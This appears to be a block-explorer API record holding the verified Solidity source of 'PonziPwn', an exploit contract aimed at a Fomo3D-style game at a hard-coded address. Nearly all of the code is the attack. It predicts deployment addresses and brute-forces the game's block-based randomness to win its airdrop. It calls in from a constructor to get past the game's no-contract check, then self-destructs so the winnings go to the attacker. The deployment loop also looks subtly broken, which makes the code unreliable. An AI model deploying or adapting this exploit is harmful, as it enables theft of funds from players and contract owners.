{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.24;\r\n\r\ninterface GameOfSwordsInterface {\r\n    function airDropTracker_() external returns (uint256);\r\n    function airDropPot_() external returns (uint256);\r\n    function withdraw() external;\r\n}\r\n\r\n/* \r\n * Contract addresses are deterministic. \r\n * We find out how many deployments it'll take to get a winning contract a\r\n * then deploy blank contracts until we get to the second last number of deployments to generate a successful address.\r\n*/\r\ncontract BlankContract {\r\n    constructor() public {}\r\n}\r\n\r\n//contract which will win the airdrop\r\ncontract AirDropWinner {\r\n    //point to Fomo3d Contract\r\n     GameOfSwordsInterface private fomo3d = GameOfSwordsInterface(0xE7d2c826292CE8bDd5e51Ce44fff4033Be657269);\r\n    /*\r\n     * 0.1 ether corresponds the amount to send to Fomo3D for a chance at winning the airDrop\r\n     * This is sent within the constructor to bypass a modifier that checks for blank code from the message sender\r\n     * As during construction a contract's code is blank.\r\n     * We then withdraw all earnings from fomo3d and selfdestruct to returns all funds to the main exploit contract.\r\n     */\r\n    constructor() public {\r\n        if(!address(fomo3d).call.value(0.1 ether)()) {\r\n           fomo3d.withdraw();\r\n           selfdestruct(msg.sender);\r\n        }\r\n\r\n    }\r\n}\r\n\r\ncontract PonziPwn {\r\n    GameOfSwordsInterface private fomo3d = GameOfSwordsInterface(0xE7d2c826292CE8bDd5e51Ce44fff4033Be657269);\r\n    \r\n    address private admin;\r\n    uint256 private blankContractGasLimit = 20000;\r\n    uint256 private pwnContractGasLimit = 250000;\r\n       \r\n    //gasPrice you'll use during the exploit\r\n    uint256 private gasPrice = 10;\r\n    uint256 private gasPriceInWei = gasPrice*1e9;\r\n    \r\n    //cost of deploying each contract\r\n    uint256 private blankContractCost = blankContractGasLimit*gasPrice ;\r\n    uint256 private pwnContractCost = pwnContractGasLimit*gasPrice;\r\n    uint256 private maxAmount = 10 ether;\r\n    \r\n    modifier onlyAdmin() {\r\n        require(msg.sender == admin);\r\n        _;\r\n    }\r\n\r\n    constructor() public {\r\n        admin = msg.sender;\r\n    }\r\n\r\n    function checkPwnData() private returns(uint256,uint256,address) {\r\n        //The address that a contract deployed by this contract will have\r\n        address _newSender = address(keccak256(abi.encodePacked(0xd6, 0x94, address(this), 0x01)));\r\n        uint256 _nContracts = 0;\r\n        uint256 _pwnCost = 0;\r\n        uint256 _seed = 0;\r\n        uint256 _tracker = fomo3d.airDropTracker_();\r\n        bool _canWin = false;\r\n        while(!_canWin) {\r\n            /* \r\n\t     * How the seed if calculated in fomo3d.\r\n             * We input a new address each time until we get to a winning seed.\r\n            */\r\n            _seed = uint256(keccak256(abi.encodePacked(\r\n                   (block.timestamp) +\r\n                   (block.difficulty) +\r\n                   ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)) +\r\n                   (block.gaslimit) +\r\n                   ((uint256(keccak256(abi.encodePacked(_newSender)))) / (now)) +\r\n                   (block.number)\r\n            )));\r\n\r\n            //Tally number of contract deployments that'll result in a win. \r\n            //We tally the cost of deploying blank contracts.\r\n            if((_seed - ((_seed / 1000) * 1000)) >= _tracker) {\r\n                    _newSender = address(keccak256(abi.encodePacked(0xd6, 0x94, _newSender, 0x01)));\r\n                    _nContracts++;\r\n                    _pwnCost+= blankContractCost;\r\n            } else {\r\n                    _canWin = true;\r\n                    //Add the cost of deploying a contract that will result in the winning of an airdrop\r\n                    _pwnCost += pwnContractCost;\r\n            }\r\n        }\r\n        return (_pwnCost,_nContracts,_newSender);\r\n    }\r\n\r\n    function deployContracts(uint256 _nContracts,address _newSender) private {\r\n        /* \r\n\t * deploy blank contracts until the final index at which point we first send ETH to the pregenerated address then deploy\r\n         * an airdrop winning contract which will have that address;\r\n        */\r\n        for(uint256 _i; _i < _nContracts; _i++) {\r\n            if(_i++ == _nContracts) {\r\n               address(_newSender).call.value(0.1 ether)();\r\n               new AirDropWinner();\r\n            }\r\n            new BlankContract();\r\n        }\r\n    }\r\n\r\n    //main method\r\n    function beginPwn() public onlyAdmin() {\r\n        uint256 _pwnCost;\r\n        uint256 _nContracts;\r\n        address _newSender;\r\n        (_pwnCost, _nContracts,_newSender) = checkPwnData();\r\n        \r\n\t//check that the cost of executing the attack will make it worth it\r\n        if(_pwnCost + 0.1 ether < maxAmount) {\r\n           deployContracts(_nContracts,_newSender);\r\n        }\r\n    }\r\n\r\n    //allows withdrawal of funds after selfdestructing of a child contract which return funds to this contract\r\n    function withdraw() public onlyAdmin() {\r\n        admin.transfer(address(this).balance);\r\n    }\r\n}","ABI":"[{\"constant\":false,\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"beginPwn\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"}]","ContractName":"PonziPwn","CompilerVersion":"v0.4.24+commit.e67f0147","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://8ee0962679fff2a32c8ca3d6bc517d5a884a84364ad05b0311c47daa4faeb926"}]}